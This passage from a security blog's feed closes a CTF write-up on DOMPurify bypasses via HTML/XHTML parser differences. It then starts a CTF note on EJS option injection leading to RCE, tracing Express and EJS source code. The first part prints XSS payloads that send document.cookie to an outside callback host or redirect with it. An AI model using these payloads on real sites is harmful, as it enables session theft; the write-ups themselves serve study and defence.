href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' /><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第二個則是 DOMPurify 在偵測 mXSS 時會檢查 valid HTML tag，需要是 ASCII alphanumeric，但是 XML 其實允許更多字元：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;<span class="token property">ø</span><span class="token punctuation">:</span>base id=<span class="token string">"giotino"</span> <span class="token property">xmlns</span><span class="token punctuation">:</span>ø=<span class="token string">"http://www.w3.org/1999/xhtml"</span> href=<span class="token string">"/**/=1;alert(document.cookie);//"</span> /></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以在 HTML context 底下是沒問題的，但是在 xhtml 還是會被解析為是 base tag。</p><p>第三個看起來跟第一個類似，但第一個簡單許多，是這樣的：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>&amp;lt;k&lt;/style>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以 HTML 來說就是一個 style + a tag + 兩個 style tag。但是以 xhtml 來說的話，會把 style 裡的 <code>&lt;!-- --&gt;</code> 也看作是註解，因此會變成：</p> <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;base href=<span class="token string">'/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'</span>>&lt;/base></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>從他想達成的效果來看，應該簡化成這樣也可以：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;前陣子忙著旅遊，沒什麼時間在打 CTF，就算有打也有點懶得寫 writeup，導致上一篇 writeup 已經是 3 月份的時候了。覺得這樣斷掉其實有點可惜，就趕快再寫一篇補回來。&lt;/p&gt;
&lt;p&gt;標題提到的這三個 CTF，我只有打 GoogleCTF 2023，其他兩場都只有稍微看一下題目而已，所以這篇也只是對題目以及解法做個筆記。&lt;/p&gt;
&lt;p&gt;關鍵字列表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Flask 跟 PHP 解析 POST data 的順序不一致&lt;/li&gt;
&lt;li&gt;iframe csp 阻止部分 script 載入&lt;/li&gt;
&lt;li&gt;HEAD 繞 CSRF&lt;/li&gt;
&lt;li&gt;location.ancestorOrigins 拿 parent origin&lt;/li&gt;
&lt;li&gt;iframe 改 location 不會改到 src&lt;/li&gt;
&lt;li&gt;recaptcha URL 的 Angular CSP bypass gadget&lt;/li&gt;
&lt;li&gt;document.execCommand(‘undo’); 還原 input&lt;/li&gt;
&lt;li&gt;X-HTTP-Method-Override&lt;/li&gt;
&lt;li&gt;HTML 與 XHTML 的 parser 差異&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>CTF 中的 EJS 漏洞筆記</title>
    <link href="https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/"/>
    <id>https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/</id>
    <published>2023-06-22T06:10:44.000Z</published>
    <updated>2023-06-22T06:29:04.795Z</updated>
    
    <content type="html"><![CDATA[<p>原本是想用開發者的角度寫一篇，但最近沒什麼時間，先寫一篇用 CTF 角度來記錄這個問題，以後有時間再補上用開發者角度寫的。</p><p>簡單來說，這篇講的是使用以下 pattern 會造成的問題：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">3000</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><h2><span id="出現過的-ctf-考題">出現過的 CTF 考題</span></h2><p>其實有關於 EJS，曾經考過的類型有兩種，第一種是像上面那樣你可以控制 render 中的第二個參數，第二種是你不能控制，但是有 prototype pollution 的漏洞。</p><p>第一種的話是 EJS 對於參數的處理其實我自己覺得有點問題，你可能以為只是傳入 data，但其實它 option 跟 data 是混在一起傳的，所以可以去更改 options，控制一些執行流程達成 RCE。</p><p>第二種的話主要是經由 prototype pollution 去污染 <code>outputFunctionName</code>，然後靠著 EJS 底層會用 <code>outputFunctionName</code> 去拼接 JS 程式碼達成 RCE。</p><p>不過後來 EJS 有新增對於 <code>outputFunctionName</code> 的檢查就是了，確保傳入的東西真的是個合法的變數名稱。</p><p>這篇文章談的主要是第一種的狀況。</p><p>底下是以前出現過的相關考題，早期比較多都是 prototype pollution 為主，最近出現的則是直接讓你傳入 object 居多。</p><ul><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2023/06/19/120016#Web-127-CODEGATE-Music-Player-30-solves">Codegate CTF 2023 Preliminary - Music Player</a></li><li><a href="https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/express-javascript-security">SEETF 2023 - Express JavaScript Security</a></li><li><a href="https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#perfect-product">justCTF 2023 - Perfect Product</a></li><li><a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">hxp CTF 2022 - valentine</a></li><li><a href="https://github.com/aszx87410/ctf-writeups/issues/35">Pwn2Win CTF 2021 - Illusion</a></li><li><a href="https://github.com/CykuTW/My-CTF-Challenges/blob/master/AIS3-EOF-CTF-2019-Quals/echo/README.zh-TW.md">AIS3 EOF CTF 2019 Quals - echo</a></li><li><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">XNUCA 2019 Qualifier - hardjs</a></li></ul><h2><span id="問題的根源">問題的根源</span></h2><p>呼叫 <code>res.render()</code> 以後會先到 <a href="https://github.com/expressjs/express/blob/4.18.2/lib/response.js#L1016">express&#x2F;lib&#x2F;response.js</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">view<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>req<span class="token punctuation">.</span>app<span class="token punctuation">;</span>  <span class="token keyword">var</span> done <span class="token operator">=</span> callback<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>req<span class="token punctuation">;</span>  <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token comment">// support callback function as second arg</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    done <span class="token operator">=</span> options<span class="token punctuation">;</span>    opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge res.locals</span>  opts<span class="token punctuation">.</span>_locals <span class="token operator">=</span> self<span class="token punctuation">.</span>locals<span class="token punctuation">;</span>  <span class="token comment">// default callback to respond</span>  done <span class="token operator">=</span> done <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">return</span> req<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    self<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render</span>  app<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> opts<span class="token punctuation">,</span> done<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接著看到 <code>app.render</code>，在 <a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L548">express&#x2F;lib&#x2F;application.js</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cache<span class="token punctuation">;</span>  <span class="token keyword">var</span> done <span class="token operator">=</span> callback<span class="token punctuation">;</span>  <span class="token keyword">var</span> engines <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>engines<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> options<span class="token punctuation">;</span>  <span class="token keyword">var</span> renderOptions <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> view<span class="token punctuation">;</span>  <span class="token comment">// support callback function as second arg</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    done <span class="token operator">=</span> options<span class="token punctuation">;</span>    opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge app.locals</span>  <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>locals<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// merge options._locals</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>_locals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> opts<span class="token punctuation">.</span>_locals<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge options</span>  <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// set .cache unless explicitly provided</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// primed cache</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    view <span class="token operator">=</span> cache<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// view</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> View <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'view'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">defaultEngine</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token literal-property property">engines</span><span class="token operator">:</span> engines    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>view<span class="token punctuation">.</span>path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> dirs <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>view<span class="token punctuation">.</span>root<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> view<span class="token punctuation">.</span>root<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span>        <span class="token operator">?</span> <span class="token string">'directories "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'", "'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'" or "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root<span class="token punctuation">[</span>view<span class="token punctuation">.</span>root<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'"'</span>        <span class="token operator">:</span> <span class="token string">'directory "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root <span class="token operator">+</span> <span class="token string">'"'</span>      <span class="token keyword">var</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Failed to lookup view "'</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'" in views '</span> <span class="token operator">+</span> dirs<span class="token punctuation">)</span><span class="token punctuation">;</span>      err<span class="token punctuation">.</span>view <span class="token operator">=</span> view<span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// prime the cache</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      cache<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> view<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// render</span>  <span class="token function">tryRender</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> renderOptions<span class="token punctuation">,</span> done<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這邊最後會呼叫 <code>tryRender</code>，程式碼在<a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L655">express&#x2F;lib&#x2F;application.js</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tryRender</span><span class="token punctuation">(</span><span class="token parameter">view<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    view<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這個 <code>view.render</code> 會去呼叫 view engine 裡面的 <code>__express</code> 方法，而這個方法在 EJS 裡面就是 <code>renderFile</code>：</p><p><a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L926">ejs&#x2F;lib&#x2F;ejs.js</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Express.js support. * * This is an alias for &#123;@link module:ejs.renderFile&#125;, in order to support * Express.js out-of-the-box. * * @func */</span>exports<span class="token punctuation">.</span>__express <span class="token operator">=</span> exports<span class="token punctuation">.</span>renderFile<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#441">renderFile</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">exports<span class="token punctuation">.</span><span class="token function-variable function">renderFile</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> cb<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">filename</span><span class="token operator">:</span> filename<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> data<span class="token punctuation">;</span>  <span class="token keyword">var</span> viewOpts<span class="token punctuation">;</span>  <span class="token comment">// Do we have a callback?</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> arguments<span class="token punctuation">[</span>arguments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    cb <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Do we have data/opts?</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Should always have data obj</span>    data <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Normal passed opts (data obj + opts obj)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Use shallowCopy so we don't pollute passed in opts obj with new vals</span>      utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Special casing for Express (settings + opts-in-data)</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Express 3 and 4</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Pull a few things from known locations</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          opts<span class="token punctuation">.</span>views <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          opts<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Undocumented after Express 2, but still usable, esp. for</span>        <span class="token comment">// items that are unsafe to be passed along with data, like `root`</span>        viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Express 2 and lower, values set in app.locals, or people who just</span>      <span class="token comment">// want to pass options in their data. NOTE: These values will override</span>      <span class="token comment">// anything previously set in settings  or settings['view options']</span>      utils<span class="token punctuation">.</span><span class="token function">shallowCopyFromList</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    opts<span class="token punctuation">.</span>filename <span class="token operator">=</span> filename<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    data <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">createNullProtoObjWherePossible</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">tryHandleCache</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> cb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這邊的重點是中間那段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Pull a few things from known locations</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    opts<span class="token punctuation">.</span>views <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    opts<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token 